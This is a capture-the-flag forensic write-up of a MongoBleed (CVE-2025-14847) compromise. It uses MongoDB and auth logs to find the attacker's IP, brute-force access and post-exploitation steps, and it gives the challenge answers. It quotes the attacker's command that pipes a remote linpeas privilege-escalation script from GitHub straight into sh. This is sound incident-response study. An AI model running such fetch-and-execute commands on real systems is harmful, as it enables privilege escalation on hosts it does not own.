
---
### Initial Analysis

The introduction states that UAC, or *Unix-like Artifacts Collector* was used, which is a triage collection tools for Unix systems.
- its a script that collects needed artifacts based on YAML files.

The output of UAC is what we have, and after unzipping it, we see the following structure:

```bash
$ ls -lah

drwxrwxrwx 1 mins mins 4.0K Dec 29  2025  .
drwxrwxrwx 1 mins mins 4.0K Nov  7 18:31  ..
drwxrwxrwx 1 mins mins 4.0K Dec 29  2025 '[root]'
drwxrwxrwx 1 mins mins 4.0K Dec 29  2025  bodyfile
drwxrwxrwx 1 mins mins 4.0K Dec 29  2025  hash_executables
drwxrwxrwx 1 mins mins 4.0K Dec 29  2025  live_response
drwxrwxrwx 1 mins mins 4.0K Dec 29  2025  system
```

The contents inside these directories is as follows:
- `[root]` has raw copies of the files from the system.
- `bodyfile` has 1 file called `bodyfile.txt` which stores the file metadata, the MAC (modified, accessed, changed) times, which can be used to build a timeline.
- `hash_executables` has the hashes of common binaries on the system in `sha1` and `md5`.
- `live_response` has outputs of commands run on the live system for different artifacts including containers, hardware, network, packages, process, storage, and system.

Now we have an idea of where we can look based on what we want to find.
- The `live_response` can be used to look at famous commands run during investigation and to get information on the host.
- The `[root]` folder can be used to look at the image itself, browsing through any log files present on investigating files we need.
- The `hash_executables` can be used to check for the hashes against known malicious hashes with threat intelligence tools like virus total.

---
### Task 1

The sherlock talks about the `MongoBleed` vulnerability.
- Going on a quick google search, we find out more about it.

**CVE-2025-14847**: It allows unauthenticated clients to leak uninitialized heap memory from the database.
- An attacker can manipulate the `uncompressedSize` field, making it larger than the actual size of the compressed payload. Because this value is not validated, this manipulation results in an oversized buffer allocation, populated with uninitialized heap memory, resulting in leaked memory to be read by the attacker.

> What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?: `CVE-2025-14847`.

---
### Task 2

Had some time exploring. I thought of several things:

1. Check the `live_response/packages` and check the version of the mongodb package present.

```
cd live_response/packages
grep -r "mongo"
```

![](pics/MangoBleed,%201.png)

Here we see 2 versions, `8.0.16` and `8.0.17`.

2. Check the `live_response/process` and check the version of the running mongodb process. Didn't find anything useful here, too much data.

3. Decided to check the `[root]` folder and investigate there. Here, we can check in multiple sources
	- The mongodb log file itself.
	- The package manager logs.

Checking the `/var/log/mongodb/mongod.log` log file and grepping for `version`
```
cd [root]/var/log/mongodb
cat mongod.log | grep "version"
```

![](pics/MangoBleed,%202.png)

Here, we see the version is `8.0.16`.

Just for practice, checking the package manager logs using this command:
```
cd [root]/var/log/apt/
grep "mongo" history.log
```

![](pics/MangoBleed,%203.png)

Here we see the user downloaded the `8.0.16` version of mongodb.

> What is the version of MongoDB installed on the server that the CVE exploited?: `8.0.16`.

---
### Task 3

Understanding first mongodb logs using this reference - [mongodb docs](https://www.mongodb.com/docs/manual/reference/log-messages/), we see:

|Field Name|Type|Description|
|---|---|---|
|`t`|Datetime|Timestamp of the log message in ISO-8601 format. For an example, see [Timestamp.](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-timestamp)|
|`s`|String|Short severity code of the log message. For an example, see [Severity.](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-severity-levels)|
|`c`|String|Full component string for the log message. For an example, see [Components.](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-components)|
|`id`|Integer|Unique identifier for the log statement. For an example, see [Filtering by Known Log ID.](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-parsing-example-filter-id)|
|`ctx`|String|Name of the thread that caused the log statement.|
|`svc`|String|Name of the service in whose context the log statement was made. Will be `S` for "shard", `R` "router", or `-` for "unknown" or "none".|
|`msg`|String|Log output message passed from the server or driver. If necessary, the message is [escaped](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-json-escaping) according to the JSON specification.|
|`attr`|Object|One or more key-value pairs for additional log attributes. If a  <br>log message does not include any additional attributes, the  <br>`attr` object is omitted.<br><br>Attribute values may be referenced by their key name in the  <br>`msg` message body, depending on the message. When required,  <br>attributes are [escaped](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-json-escaping)  <br>according to the JSON specification.|
|`tags`|Array of strings|Strings representing any tags applicable to the log statement. For example, `["startupWarnings"]`.|
|`truncated`|Object|Information about the [log message truncation](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-truncation), if applicable. Only included if the log entry contains at least one truncated `attr` attribute.|
|`size`|Object|Original size of a log entry if it has been [truncated](https://www.mongodb.com/docs/manual/reference/log-messages/#std-label-log-message-truncation). Only included if the log entry contains at least one truncated `attr` attribute.|

We see this is a JSON file, so we can use `jq` for simpler parsing.
- Now, we need to figure out the IP address of the attacker.

Doing some research, the way to detect this attack is to look for a lot of quick connections and disconnections made by an IP, without exchanging any metadata in between.
- These events can be easily visualized using the following log IDs:
	- `22943`: connections
	- `22944`: disconnections
	- `51800`: metadata sent.

> However, simply counting these events is not enough, as it might be a busy server. so we need to check also that these events are quick and after another. This attack is characterized by thousands of connections and disconnections very quickly in a burst like manner.

So what we can do is after we obtain some suspicious IPs by looking at the count of connections & disconnections, we can look at the frequency of these connections.

First, we print the log file using JQ to see how we can filter on the ID value:
```
cat mongod.log | jq .
```

Grabbing a random entry for the example

![](pics/MangoBleed,%204.png)

We see here we can obtain the `date`, `id`, and IP using the following JSON paths:
```
.t.$date
.id
.attr.remote
```

Now, what we can do is count the number of connection started and connection ended using these two commands:

- For number of connections per IP:
```
cat mongod.log | jq 'select(.id==22943) | .attr.remote' | cut -d: -f1 | sort | uniq -c | sort -rn
```

- For number of disconnections per IP:
```
cat mongod.log | jq 'select(.id==22944) | .attr.remote' | cut -d: -f1 | sort | uniq -c | sort -rn
```

For both of these commands, we get the same IP address and the same count:
```
37630 65.0.76.43
```
- Therefore, this IP address connected and disconnected 37630 times.

We check for the metadata exchange using the final ID, `51800`:
```
cat mongod.log | jq 'select(.id==51800) | .attr.remote' | cut -d: -f1 | sort | uniq -c | sort -rn
```
- We get no events at all.

This is suspicious.
- however, to confirm our finding, we can take a look by filtering the log file for only entries containing this IP address, and checking the frequency of the connections and whether it looks suspicious as well.

```
cat mongod.log | jq . -c | grep 65.0.76.43 | jq . -c
```
- The `-c` is used to make each JSON row 1 line so we can grep on it. I then run it again for the coloring.

taking a snapshot, we see that the connections and disconnections happen literally every 1,000th of a second, which is indicative of the attack:
- We also don't see the metadata exchange at all.

![](pics/MangoBleed,%205.png)

> Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE. : `65.0.76.43`.

---
### Task 4

To obtain the first malicious activity event, we simply need to find the first match for the IP in the file:
```
grep -m1 '65.0.76.43' mongod.log | jq .
```

![](pics/MangoBleed,%206.png)

The first connection from the adversary was at `2025-12-29 05:25:52`.

> Based on the MongoDB logs, determine the exact date and time the attacker’s exploitation activity began (the earliest confirmed malicious event): `2025-12-29 05:25:52`

---
### Task 5

We did that above, we can sum up the connections and disconnections to get:

```
37630 * 2 = 75260
``` 

---
### Task 6

To look for this type of event, we are mainly looking at authentication logs which can be obtained from the `[root]/var/log/auth.log` file.
- There, we can filter on the attacker's IP address and look at its activity.

```
cd [root]/var/log/
cat auth.log | grep 65.0.76.43
```

Running this command we see a lot of connection attempts that fail from the IP address.
- Limiting our scope to only successful authentication attempts:
```
cat auth.log | grep 65.0.76.43 | grep Accepted
```

![](pics/MangoBleed,%207.png)

We see that 2 sessions were opened:
- `39825`
- `39962`

Running GREP on these 2 sessions to see how long each lasted and what happened in both:

![](pics/MangoBleed,%208.png)


![](pics/MangoBleed,%209.png)

We see that the second session lasts for about 8 minutes, unlike the first which was terminated in the same second it opened.
- Both were for the account `mongoadmin`.
- This shows that the first session was that of an automated brute force tool that was simply trying credentials.
- The second session was when the attacker used the creds to infiltrate the server, and spent about 8 minutes. This began at `2025-12-29 05:40:03`

> The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?: `2025-12-29 05:40:03`.

---
### Task 7 & 8

We see the attacker managed to login to the `mongoadmin` account, we can check the execution history of that user by viewing the `~/.bash_history` file.

```
cd [root]/home/mongoadmin
cat .bash_history
```

![](pics/MangoBleed,%2010.png)

From here, we see the `linpeas` privilege escalation script and the python server that was started in the `/var/lib/mongodb` directory.

> Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.: `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`.

> The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?: `/var/lib/mongodb`.

---
